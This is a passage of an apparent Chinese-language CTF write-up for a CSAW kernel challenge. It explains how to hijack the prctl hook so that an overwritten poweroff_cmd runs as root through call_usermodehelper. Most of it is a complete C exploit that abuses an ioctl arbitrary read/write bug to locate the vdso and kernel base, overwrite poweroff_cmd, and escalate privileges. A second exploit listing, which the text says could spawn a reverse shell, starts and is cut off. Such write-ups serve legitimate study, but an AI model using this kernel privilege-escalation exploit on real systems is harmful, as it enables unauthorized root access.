class="line"><span class="keyword">if</span> (ret &amp;&amp; force) &#123;</span><br><span class="line">pr_warn(<span class="string">&quot;Failed to start orderly shutdown: forcing the issue\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * I guess this should try to kick off some daemon to sync and</span></span><br><span class="line"><span class="comment"> * poweroff asap.  Or not even bother syncing if we&#x27;re doing an</span></span><br><span class="line"><span class="comment"> * emergency shutdown?</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">emergency_sync();</span><br><span class="line">kernel_power_off();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里的run_cmd是会调用call_usermodehelper，我们只需要把prctl_task劫持到这几个函数，比如__orderly_poweroff，然后篡改poweroff_cmd为我们需要执行的二进制文件路径。接着调用prctl，就会以root权限执行我们的二进制文件，从而提权。为了实现上述目标，我们首先需要得到内核基址，在上一篇也提到了怎么计算出vdso地址，我们有了vdso地址也可以得出内核基地址了。</p><p>综上可得出exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE 0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE + 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE + 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL CSAW_IOCTL_BASE + 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE + 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL CSAW_IOCTL_BASE + 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE + 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE + 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE + 8</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">size_t</span> buf_size;</span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">char</span> *buf;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">char</span> *buf;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">int</span> index;</span><br><span class="line"><span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ((len / <span class="number">8</span>) * <span class="number">8</span>); i += <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%lx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i));</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">16</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_vdso_userspace</span><span class="params">(<span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0</span>;</span><br><span class="line">addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="keyword">if</span> (addr &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-]cannot get vdso addr&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = len; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, *(<span class="keyword">char</span> *)(addr + i));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_vsdo_shellcode</span><span class="params">(<span class="keyword">char</span> *shellcode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0</span>;</span><br><span class="line">addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;vdso:%lx\n&quot;</span>, addr);</span><br><span class="line"><span class="keyword">if</span> (addr &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-]cannot get vdso addr&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (memmem((<span class="keyword">char</span> *)addr, <span class="number">0x1000</span>, shellcode, <span class="built_in">strlen</span>(shellcode)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_gettimeofday_str_offset</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> vdso_addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="keyword">char</span> *name = <span class="string">&quot;gettimeofday&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!vdso_addr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-]error get name&#x27;s offset&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> name_addr = memmem(vdso_addr, <span class="number">0x1000</span>, name, <span class="built_in">strlen</span>(name));</span><br><span class="line"><span class="keyword">if</span> (name_addr &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-]error get name&#x27;s offset&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> name_addr - vdso_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">size_t</span> result = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">alloc_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">shrink_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> <span class="title">close_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_args</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0xffffffff80000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> real_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> target_addr;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> selinux_disable_addr = <span class="number">0x2C7BA0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prctl_hook = <span class="number">0x124FD00</span>;</span><br><span class="line"><span class="keyword">size_t</span> order_cmd = <span class="number">0x123D1E0</span>;</span><br><span class="line"><span class="keyword">size_t</span> poweroff_work_func_addr = <span class="number">0x9C4C0</span>;</span><br><span class="line"><span class="keyword">int</span> root_cred[<span class="number">12</span>];</span><br><span class="line"><span class="keyword">int</span> offset;</span><br><span class="line">offset = get_gettimeofday_str_offset();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;gettimeofday str in vdso.so offset=0x%x\n&quot;</span>, offset);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line"><span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(target, <span class="string">&quot;trytofind196082&quot;</span>);</span><br><span class="line"></span><br><span class="line">fd = open(<span class="string">&quot;/proc/simp1e&quot;</span>, O_RDWR);</span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-] open error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alloc_args.buf_size = <span class="number">0x100</span>;</span><br><span class="line">alloc_args.id = <span class="number">-1</span>;</span><br><span class="line">ioctl(fd, CSAW_ALLOC_CHANNEL, &amp;alloc_args);</span><br><span class="line"><span class="keyword">if</span> (alloc_args.id == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-] alloc_channel error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] now we get a channel %d\n&quot;</span>, alloc_args.id);</span><br><span class="line">shrink_args.id = alloc_args.id;</span><br><span class="line">shrink_args.size = <span class="number">0x100</span> + <span class="number">1</span>;</span><br><span class="line">ioctl(fd, CSAW_SHRINK_CHANNEL, &amp;shrink_args);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] we can read and write any momery&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (; addr &lt; <span class="number">0xffffffffffffefff</span>; addr += <span class="number">0x1000</span>)</span><br><span class="line">&#123;</span><br><span class="line">seek_args.id = alloc_args.id;</span><br><span class="line">seek_args.index = addr - <span class="number">0x10</span>;</span><br><span class="line">seek_args.whence = SEEK_SET;</span><br><span class="line">ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">read_args.id = alloc_args.id;</span><br><span class="line">read_args.buf = buf;</span><br><span class="line">read_args.count = <span class="number">0x1000</span>;</span><br><span class="line">ioctl(fd, CSAW_READ_CHANNEL, &amp;read_args);</span><br><span class="line"><span class="keyword">if</span> ((!<span class="built_in">strcmp</span>(<span class="string">&quot;gettimeofday&quot;</span>, buf + offset)))</span><br><span class="line">&#123;</span><br><span class="line">result = addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] found vdso %lx\n&quot;</span>, result);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;not found , try again &quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">kernel_base = addr - <span class="number">0x1020000</span>;</span><br><span class="line">prctl_hook += kernel_base;</span><br><span class="line">order_cmd += kernel_base;</span><br><span class="line">poweroff_work_func_addr += kernel_base;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] found kernel base: %lx\n&quot;</span>, kernel_base);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] found prctl_hook: %lx\n&quot;</span>, prctl_hook);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] found order_cmd : %lx\n&quot;</span>, order_cmd);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] found poweroff_work_func_addr: %lx\n&quot;</span>, poweroff_work_func_addr);</span><br><span class="line">ioctl(fd, CSAW_CLOSE_CHANNEL, &amp;close_args);</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(buf, <span class="string">&quot;/bin/chmod 777 /flag\0&quot;</span>);</span><br><span class="line">seek_args.id = alloc_args.id;</span><br><span class="line">seek_args.index = order_cmd - <span class="number">0x10</span>;</span><br><span class="line">seek_args.whence = SEEK_SET;</span><br><span class="line">ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = buf;</span><br><span class="line">write_args.count = <span class="built_in">strlen</span>(buf) + <span class="number">1</span>;</span><br><span class="line">ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">seek_args.id = alloc_args.id;</span><br><span class="line">seek_args.index = order_cmd + <span class="number">20</span> - <span class="number">0x10</span>;</span><br><span class="line">seek_args.whence = SEEK_SET;</span><br><span class="line">ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = buf;</span><br><span class="line">write_args.count = <span class="number">1</span>;</span><br><span class="line">ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">*(<span class="keyword">size_t</span> *)buf = poweroff_work_func_addr;</span><br><span class="line">seek_args.id = alloc_args.id;</span><br><span class="line">seek_args.index = prctl_hook - <span class="number">0x10</span>;</span><br><span class="line">seek_args.whence = SEEK_SET;</span><br><span class="line">ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = buf;</span><br><span class="line">write_args.count = <span class="number">20</span> + <span class="number">1</span>;</span><br><span class="line">ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);</span><br><span class="line"></span><br><span class="line">prctl(addr, <span class="number">2</span>, addr, addr, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上程序的效果是修改权限，当然也是可以反弹shell的，不过需要再写一个程序并且上面的exp也需要修改一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE 0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE + 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL 